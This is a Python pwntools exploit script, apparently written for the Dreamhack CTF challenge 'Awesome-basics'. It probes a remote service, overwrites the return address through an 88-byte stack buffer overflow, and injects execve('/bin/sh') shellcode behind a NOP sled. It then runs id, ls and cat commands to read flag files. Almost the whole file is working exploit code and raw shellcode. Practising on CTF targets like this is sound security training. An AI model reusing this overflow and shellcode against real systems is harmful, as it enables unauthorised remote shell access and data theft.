#!/usr/bin/env python3

from pwn import *

HOST = 'host8.dreamhack.games'
PORT = 13646

def test_connection():
    """기본 연결 테스트"""
    try:
        print("[+] Testing basic connection...")
        r = remote(HOST, PORT)
        
        # 프롬프트 기다리기
        prompt = r.recvuntil(b"Your Input:", timeout=5)
        print(f"[+] Received: {repr(prompt)}")
        
        # 간단한 입력
        r.sendline(b"hello")
        
        # 응답 확인
        try:
            response = r.recv(timeout=3)
            print(f"[+] Response: {repr(response)}")
        except:
            print("[-] No additional response")
        
        r.close()
        
    except Exception as e:
        print(f"[-] Connection test failed: {e}")

def test_overflow():
    """버퍼 오버플로우 테스트"""
    try:
        print("\n[+] Testing buffer overflow...")
        r = remote(HOST, PORT)
        
        r.recvuntil(b"Your Input:", timeout=5)
        
        # 88바이트 + 8바이트 (정확한 RIP 제어 위치)
        payload = b"A" * 88 + p64(0x4141414141414141)
        
        print(f"[+] Sending {len(payload)} bytes...")
        r.sendline(payload)
        
        # 응답 확인
        try:
            response = r.recv(timeout=3)
            print(f"[+] Response: {repr(response)}")
        except:
            print("[-] No response (possibly crashed)")
        
        r.close()
        
    except Exception as e:
        print(f"[-] Overflow test failed: {e}")

def test_shellcode():
    """쉘코드 테스트"""
    try:
        print("\n[+] Testing shellcode injection...")
        r = remote(HOST, PORT)
        
        r.recvuntil(b"Your Input:", timeout=5)
        
        # 간단한 execve("/bin/sh") 쉘코드
        shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
        
        # NOP sled + shellcode + padding + return address
        nop_sled = b"\x90" * 40
        payload = nop_sled + shellcode
        padding = 88 - len(payload)
        if padding > 0:
            payload += b"A" * padding
        
        # 스택 주소 (추정)
        stack_addr = p64(0x7fffffffe000)
        payload += stack_addr
        
        print(f"[+] Shellcode size: {len(shellcode)}")
        print(f"[+] Total payload: {len(payload)}")
        
        r.sendline(payload)
        
        # 셸이 생겼는지 확인
        print("[+] Checking for shell...")
        r.sendline(b"id")
        
        response = r.recv(timeout=3)
        print(f"[+] Shell test response: {repr(response)}")
        
        if b"uid=" in response:
            print("[!] SHELL OBTAINED!")
            # 플래그 찾기
            r.sendline(b"ls -la")
            ls_response = r.recv(timeout=2)
            print(f"[+] Directory listing: {repr(ls_response)}")
            
            r.sendline(b"cat flag")
            flag_response = r.recv(timeout=2)
            print(f"[!] Flag response: {repr(flag_response)}")
            
            r.sendline(b"cat /tmp/flag")
            tmp_flag_response = r.recv(timeout=2)
            print(f"[!] /tmp/flag response: {repr(tmp_flag_response)}")
        
        r.close()
        
    except Exception as e:
        print(f"[-] Shellcode test failed: {e}")

if __name__ == "__main__":
    print("=== Awesome-basics Exploit Testing ===")
    
    # 단계별 테스트
    test_connection()
    test_overflow()
    test_shellcode()
